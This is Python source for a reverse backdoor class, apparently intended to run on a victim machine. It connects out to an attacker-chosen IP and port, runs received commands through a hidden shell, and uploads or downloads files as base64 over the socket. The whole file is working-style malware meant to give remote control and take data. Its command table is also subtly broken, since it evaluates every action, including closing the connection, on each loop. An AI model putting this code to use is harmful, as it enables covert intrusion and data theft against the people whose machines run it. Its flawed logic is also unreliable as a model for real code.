"""Module containing the class to be run on the target machine"""

# Standard Library imports
import socket
import subprocess
import json
import os
import base64
from typing import List


class ReverseBackdoor:

    def __init__(self, remote_ip: str, remote_port: int, listener: socket.socket) -> None:
        """
        Initializer that takes the IP of the attacker machine, the port being listened too,
        and an instantiated listener from the socket package.

        :param remote_ip: (required) String containing the IP of the attackers listening endpoint (e.g., "192.168.10.130")
        :param remote_port: (required) Int that contains the port (e.g., 4444)
        :param listener: (required) Instantiated listener object from socket package
        """

        # set class attributes
        self.connection = listener  # create instance of the socket object | set TCP socket connection
        self.connection.connect((remote_ip,
                                 remote_port))  # establish connection to remote machine with IP/port | connect method expects tuple so wrap in ()

    def serialize_as_json_and_send(self, data: List[str]) -> None:
        """
        Method that takes in a command as a string and converts it to
        a JSON string that will be sent via the socket to the target machine
        to execute locally. The JSON is then encoded to utf-8 byte string for
        ability to upload/download images, files, etc...

        :param data: (required) String command (e.g., 'dir', 'ls', 'cwd', etc...)
        :return: None
        """
        self.connection.send(json.dumps(data).encode())

    def deserialize_and_return(self) -> bytes:
        """
        Method that takes the encoded data from the target machine
        and writes the bytes to an empty byte string. This byte string
        is then returned as a python structure.

        :return: Dictionary containing the contents from the target machine
        """
        json_data = b""  # create an empty byte string
        while True:  # create infinite loop to collect all data from the TCP stream in the pipe
            try:  # check to see if all data has been collected and JSON deserialization can occur
                json_data = json_data + self.connection.recv(
                    1024)  # update the empty string with 1024 bytes of data plus whatever already is in the jsonData var
                return json.loads(json_data)
            except ValueError:  # if error occurs continue to collect data from stream until fully collected
                continue

    @staticmethod
    def exe_system_command(command: bytes) -> bytes:
        """
        This static method contains the code to start the shell on the target machine.
        The shell will be hidden from the foreground with the DEVNULL optional params.

        :param command: (required) A string command passed from the attacker machine
        :return: The byte representation of the return from the stdout from the passed command
        """
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL,
                                       stdin=subprocess.DEVNULL)  # hide the shell that launches when running exe backdoor

    @staticmethod
    def change_working_dir(path: str) -> str:
        """
        Static method designed to handle the OS directory change requests from attacker.

        :param path: (required) String path of the directory that is wanted (e.g., C:/Users/)
        :return: Strings to be printed that confirm or deny successful changes
        """
        try:  # try to run the os change dir path
            os.chdir(path)
            return "[+] Changing Working Directory"
        except WindowsError:  # except if the path cannot be found
            return "[-] The system cannot find the file/dir named " + path

    @staticmethod
    def write_file_from_bytes(path: str, content: bytes) -> str:
        """
        Static method that is used to write the byte content from the
        target machine to the local directory after decoded from base64.

        :param path: File path to where the content should be written to, defaults to local
        :param content: Bytes from the target machine response
        :return: Return a string response to print
        """
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Target received file successfully"

    @staticmethod
    def read_file_to_bytes(path: str) -> bytes:
        """
        Static method to base64 encode a file located at the path provided.

        :param path: File path to where the content should be read from, defaults to local
        :return: Bytes from the read file located at provided path
        """
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())  # encode it in base64 to prevent unknown character errors

    # Run the backdoor listener
    def startListening(self) -> None:
        while True:  # keep the target listener open until needing to be closed
            command = self.deserialize_and_return()
            cmd_tree = {
                'exit': self.connection.close(),
                'cd': self.change_working_dir(command[1]),
                'download': self.read_file_to_bytes(command[1]).decode(),
                'upload': self.write_file_from_bytes(command[1], command[2])
            }

            try:  # keep the socket connection alive no matter what exception occurs
                if command[0] in cmd_tree:
                    result_command = cmd_tree[command[0]]
                else:
                    result_command = self.exe_system_command(
                        command).decode()  # py3 | pass the output of command to remote host
            except Exception:
                self.serialize_as_json_and_send(["[-] Error during command execution"])
            else:
                self.serialize_as_json_and_send(result_command)
